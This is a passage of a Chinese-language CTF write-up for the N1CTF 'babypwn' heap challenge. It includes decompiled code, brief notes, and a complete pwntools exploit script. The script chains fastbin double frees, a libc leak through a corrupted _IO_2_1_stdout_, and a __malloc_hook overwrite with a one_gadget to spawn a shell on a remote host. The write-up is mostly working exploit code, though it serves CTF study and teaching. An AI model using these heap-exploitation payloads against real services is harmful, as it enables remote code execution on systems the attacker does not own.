        }
        *((_DWORD *)buf[v3] + 6) = nbytes;
        v0 = buf[v3];
        v0[2] = malloc(nbytes);
        if ( !*((_QWORD *)buf[v3] + 2) )
        {
          puts("Malloc error!");
          exit(0);
        }
        printf("Description:");
        read(0, *((void **)buf[v3] + 2), (unsigned int)nbytes);
        puts("OK!");
      }
      else
      {
        puts("Member is full!");
      }
      return __readfsqword(0x28u) ^ nbytes_4;
    }
在一开始在清空一次bss指针列表，并设置了0x31的size位
    #--------------------------------------------    # prepare for clear
    add('AAAA', 0x60, 'BBBB')   # 0
    add('AAAA', 0x60, 'BBBB')   # 1
    delete(0)   # double free
    delete(1)
    delete(0)
    add('xxxx', 0x60, p64(0x60203d))    # 2
    add('xxxx', 0x60, 'xxxx')   # 3
    add('xxxx', 0x60, 'xxxx')   # 4
    # for adjust addr
    add('zzzz', 0x70, 'zzzz')   # 5
    for i in range(3):  # 6 7 8
        add('yyyy', 0x20, 'yyyy')
    add('xxxx', 0x68, chr(0)*3 + p64(0) + p64(0x31) + p64(0)*4 + p64(0x31) + p64(0) * 5)    # 9
为了以占用更少的分配次数便于后续清空，我在指针列表中其中一项设置size位0x31，这里牺牲了一次add次数
    gef➤  tel 0x602060-0x10 20
    0x0000000000602050│+0x0000: 0x0000000000000000
    0x0000000000602058│+0x0008: 0x0000000000000031 ("1"?)
    0x0000000000602060│+0x0010: 0x0000000000000000
    0x0000000000602068│+0x0018: 0x0000000000000000
    0x0000000000602070│+0x0020: 0x0000000000000000
    0x0000000000602078│+0x0028: 0x0000000000000000
    0x0000000000602080│+0x0030: 0x0000000000000031 ("1"?)
    0x0000000000602088│+0x0038: 0x0000000000000000
    0x0000000000602090│+0x0040: 0x0000000000000000
    0x0000000000602098│+0x0048: 0x0000000000000000
    0x00000000006020a0│+0x0050: 0x0000000000000000
    0x00000000006020a8│+0x0058: 0x0000000000000000
后续只要构造fastbin loop，在`add('x', 0x20, 'y')`两次即可清空指针列表
以下过程leak出libc地址
  1. add 0x90 大小的chunk，free掉后该chunk进入unsorted bin，暴露出libc地址
  2. 重新分配到该chunk的控制块，修改掉该chunk的size位(0x71)
  3. 从unsorted bin分配出一块chunk，并将盖低16位改到`_IO_2_1_stdout_`
  4. 覆写`_IO_2_1_stdout_`泄漏出libc地址
继续构造fastbin loop，将`malloc_hook`覆盖为`one_gadget`拿shell。（具体细节可以参考writeup里注释）
#### EXP
完整的EXP
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import os, sys
    # Setting at first
    DEBUG = 1
    LIBCV = 2.19
    context.arch = "amd64"
    context.log_level = "debug"
    elf = ELF("./babypwn",checksec=False)
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.ra = tube.recvall
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if DEBUG == 1:
        if context.arch == "i386":
            libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
        elif context.arch == "amd64":
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
            #libc = ELF("./libc6_2.23-0ubuntu10_amd64.so",checksec=False)
            #libc = ELF("./libc6_2.23-0ubuntu11_amd64.so",checksec=False)
        #s = process("./babypwn", env={"LD_PRELOAD" : "./libc6_2.23-0ubuntu11_amd64.so"})
        s = process("./babypwn")
    elif DEBUG == 2:
        if context.arch == "i386":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/x86/glibc-"+str(LIBCV)+"/x86/ld-linux-x86-64.so.2 babypwn")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x86:/libc.so.6 babypwn")
        elif context.arch == "amd64":
            libc = ELF("/root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/libc.so.6",checksec=False)
            os.system("patchelf --set-interpreter /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64/ld-linux-x86-64.so.2 babypwn")
            os.system("patchelf --set-rpath /root/toolchain/elf/glibc/glibc-"+str(LIBCV)+"/x64:/libc.so.6 babypwn")
        s = process("./babypwn")
    elif DEBUG == 3:
        #libc = ELF("./libc6_2.23-0ubuntu10_amd64.so",checksec=False)
        libc = ELF("./libc6_2.23-0ubuntu11_amd64.so",checksec=False)
        #libc = ELF("./libc6_2.23-0ubuntu3_amd64.so",checksec=False)
        ip = "49.232.101.41" 
        port = 9999
        s = remote(ip,port)
    def menu(x):
        s.sla("choice:", str(x))
    def add(name, size, data):
        menu(1)
        s.sa("name:", name)
        s.sla("size:", str(size))
        s.sa("Description:", data)
    def delete(idx):
        menu(2)
        s.sla("index:", str(idx))
    def pwn():
        #--------------------------------------------        # prepare for clear
        add('AAAA', 0x60, 'BBBB')   # 0
        add('AAAA', 0x60, 'BBBB')   # 1
        delete(0)   # double free
        delete(1)
        delete(0)
        add('xxxx', 0x60, p64(0x60203d))    # 2
        add('xxxx', 0x60, 'xxxx')   # 3
        add('xxxx', 0x60, 'xxxx')   # 4
        # for adjust addr
        add('zzzz', 0x70, 'zzzz')   # 5
        for i in range(3):  # 6 7 8
            add('yyyy', 0x20, 'yyyy')
        add('xxxx', 0x68, chr(0)*3 + p64(0) + p64(0x31) + p64(0)*4 + p64(0x31) + p64(0) * 5)    # 9
        #--------------------------------------------------        # prepare for hijack
        #z(0x4009A2)
        add('AAAA', 0x20, 'BBBB')   # 0
        add(p64(0x31)*2, 0x80, 'B'*0x60 + p64(0) +p64(0x21))    # 1
        add('AAAA', 0x20, 'BBBB')       # 2
        # loop for edit heap stucture
        delete(2)
        delete(0)
        delete(2)
        # get unsorted bin
        delete(1)
        # change to _IO_2_1_stdout_
        add('\x40', 0x10, '\xdd\x95')   # 3
        # add 0x60 size chunk and make sure the low size near to unsorted bin 
        add('yyyy', 0x60, 'xxxx')   # 5
        # edit size of unsored bin(0x71)
        add('x', 0x28 , p64(0)+p64(0x80)+p64(0)+p64(0x71))  # 6
        # loop for repair
        delete(2)
        delete(0)
        delete(2)
        # repair fastbin
        add(p64(0)*2, 0x60, 'xxxx') # 7
        # loop for leak
        delete(7)
        delete(5)
        delete(7)
        # loop for clear
        delete(2)
        delete(0)
        delete(2)
        # clear ptr list
        add(p64(0x602078), 0x20, p64(0x602078)) # 8
        add('x', 0x28, p64(0) * 5)  # 9
        #--------------------------------------------------        # loop for repair
        delete(2)
        delete(0)
        delete(2)
        # repair fastbin
        add(p64(0)*2, 0x60, '\x60') # 5
        add('xxxx', 0x60, 'yyyy')   # 6
        add('xxxx', 0x60, 'yyyy')   # 7
        # loop for clear
        delete(2)
        delete(0)
        delete(2)
        # clear ptr list
        add(p64(0x602078), 0x20, p64(0x602078)) # 8
        add('x', 0x28, p64(0) * 5)  # 9
        #---------------------------------------------------        # loop for repair
        delete(2)
        delete(0)
        delete(2)
        #### z(0x4009A2) #####
        # repair fastbin
        add(p64(0)*2, 0x60, 'yyyy') # 5
        # leak
        add('xxxx', 0x60, chr(0)*3 + p64(0)*6 + p64(0xfbad3887) + p64(0) * 3 + "\0")    # 6
        s.ru(p64(0xfbad3887))
        s.r(0x60)
        stdout = libc.sym["_IO_2_1_stdout_"]
        libc.address = u64(s.r(6) + "\0\0") - libc.sym["_IO_2_1_stdin_"]
        free_hook = libc.sym["__free_hook"]
        malloc_hook = libc.sym["__malloc_hook"]
        one_shot1 = libc.address + 0x45216
        one_shot2 = libc.address + 0x4526a  
        one_shot3 = libc.address + 0xf02a4
        one_shot4 = libc.address + 0xf1147  # well
        '''
        # 11
        one_shot1 = libc.address + 0x45216
        one_shot2 = libc.address + 0x4526a  
        one_shot3 = libc.address + 0xf02a4
        one_shot4 = libc.address + 0xf1147  # well
        # 10
        one_shot1 = libc.address + 0x45216
        one_shot2 = libc.address + 0x4526a  # well
        one_shot3 = libc.address + 0xf02a4
        one_shot4 = libc.address + 0xf1147
        # 3
        one_shot1 = libc.address + 0x45206
        one_shot2 = libc.address + 0x4525a # well
        one_shot3 = libc.address + 0xef9f4
        one_shot4 = libc.address + 0xf0897
        ~/toolchain/elf/libc-database(master) # ./find _IO_2_1_stdin_ 8e0   root@ubuntu
        ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
        archive-glibc (id libc6_2.23-0ubuntu11_amd64)
        archive-glibc (id libc6_2.23-0ubuntu3_amd64)
        archive-old-glibc (id libc6_2.3.5-1ubuntu12.5.10.1_i386)
        archive-glibc (id libc6-amd64_2.23-0ubuntu10_i386)
        archive-glibc (id libc6-amd64_2.23-0ubuntu11_i386)
        archive-glibc (id libc6-amd64_2.23-0ubuntu3_i386)
        '''
        info("libc.address 0x%x", libc.address)
        info("free_hook 0x%x", free_hook)
        info("malloc_hook 0x%x", malloc_hook)
        info("one_shot1 0x%x", one_shot1)
        info("one_shot2 0x%x", one_shot2)
        info("one_shot3 0x%x", one_shot3)
        info("one_shot4 0x%x", one_shot4)
        #-------------------------------------------------        # loop for clear
        delete(0)   
        delete(2)
        delete(0)
        # clear ptr list
        add(p64(0x602078), 0x20, p64(0x602078)) # 7
        add('x', 0x28, p64(0) * 5)  # 8
        #----------------------------------------------------        # loop for repair
        delete(2)
        delete(0)
        delete(2)
        # repair fastbin
        add(p64(0)*2, 0x60, 'yyyy') # 5
        add('xxxx', 0x60, 'yyyy')   # 6
        # loop for hajack
        delete(5)
        delete(6)
        delete(5)
        # target
        add('xxxx', 0x60, p64(malloc_hook-0x23))    # 7
        # loop for clear
        delete(2)
        delete(0)
        delete(2)
        # clear ptr list
        add(p64(0x602078), 0x20, p64(0x602078)) # 8
        add('x', 0x28, p64(0) * 5)  # 9
        #-----------------------------------------------        # loop for repair
        delete(2)
        delete(0)
        delete(2)
        # repair fastbin
        add(p64(0)*2, 0x60, 'yyyy') # 5
        add('xxxx', 0x60, 'yyyy')   # 6
        # hijack rip
        add('xxxx', 0x60, chr(0)*3 + p64(0)*2 + p64(one_shot4))   # 8
        s.irt()
        #clean()
        # N1CTF{IT_IS_A_BABYPWN_JUST_BURST_IT_WELCOME_TO_N1CTF}
    if __name__ == "__main__":
        pwn()
pwn~